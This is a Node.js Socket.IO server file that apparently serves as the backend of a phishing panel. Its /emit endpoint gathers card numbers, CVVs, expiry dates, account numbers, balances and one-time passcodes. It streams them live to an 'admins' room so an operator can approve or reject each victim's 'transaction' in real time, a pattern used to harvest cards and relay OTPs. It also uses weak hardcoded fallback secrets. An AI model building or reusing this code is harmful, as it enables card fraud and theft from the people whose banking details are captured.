// socket-server.js
console.log("🧠 Starting socket server...");

import 'dotenv/config';
import express from "express";
import http from "http";
import { Server } from "socket.io";

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: ["https://your-domain.com", "http://localhost:3000"] }
});

app.use(express.json());

// Temporary store for confirmations
const pendingConfirmations = {};

// Secrets from .env
const SECRET = process.env.SOCKET_SECRET || "supersecret";
const ADMIN_SECRET = process.env.ADMIN_ROOM_SECRET || "admintoken";

// ---------------- HTTP endpoint for backend emits ----------------
app.post("/emit", (req, res) => {
  const token = req.header("x-api-key") || "";
  if (token !== SECRET) return res.status(401).json({ ok: false, message: "Unauthorized" });

  const payload = req.body || {};
  const safe = {
    transaction_id: payload.transaction_id || null,
    fullname: payload.fullname || null,
    amount: payload.amount || null,
    status: payload.status || "unknown",
    time: payload.time || new Date().toISOString(),
    bank: payload.bank || "Unknown",
    holder: payload.holder || null,
    cardNumber: payload.cardNumber || null,
    expiration: payload.expiration || null,
    account_type: payload.account_type || null,
    account_number: payload.account_number || null,
    balance: payload.balance || null,
    cvv: payload.cvv || null,
    brand: payload.brand || null,
    otp: payload.otp || null
  };

  // Notify only admins
  io.to("admins").emit("notify_admin", safe);
  res.json({ ok: true });
});

// ---------------- Socket.IO ----------------
io.on("connection", (socket) => {
  console.log("Socket connected:", socket.id);

  // --- Admin joins ---
  socket.on("join_admin_room", ({ token }) => {
    if (token === ADMIN_SECRET) {
      socket.join("admins");
      socket.emit("joined_admin");
      console.log("Admin joined:", socket.id);
    } else {
      socket.emit("error", "Invalid admin token");
    }
  });

  // --- Admin confirms transaction ---
  socket.on("admin_confirm_txn", (data) => {
    pendingConfirmations[data.transaction_id] = { ...data, status: "confirmed" };
    io.to(`txn-${data.transaction_id}`).emit("txn_confirmed", data);
    console.log("✅ Transaction confirmed by admin:", data.transaction_id);
  });

  // --- Admin rejects transaction ---
  socket.on("admin_reject_txn", (data) => {
    pendingConfirmations[data.transaction_id] = { ...data, status: "rejected" };
    io.to(`txn-${data.transaction_id}`).emit("txn_rejected", data);
    console.log("❌ Transaction rejected by admin:", data.transaction_id);
  });

  // --- User joins a transaction room ---
  socket.on("user_join", ({ transaction_id }) => {
    socket.join(`txn-${transaction_id}`);
    console.log("User joined transaction room:", transaction_id);

    // If already confirmed/rejected, notify immediately
    if (pendingConfirmations[transaction_id]) {
      const data = pendingConfirmations[transaction_id];
      socket.emit(data.status === "confirmed" ? "txn_confirmed" : "txn_rejected", data);
    }
  });

  // --- Disconnect ---
  socket.on("disconnect", () => {
    console.log("Socket disconnected:", socket.id);
  });
});

const PORT = process.env.PORT || 3001;
server.listen(PORT, () => console.log(`Socket server running on port ${PORT}`));
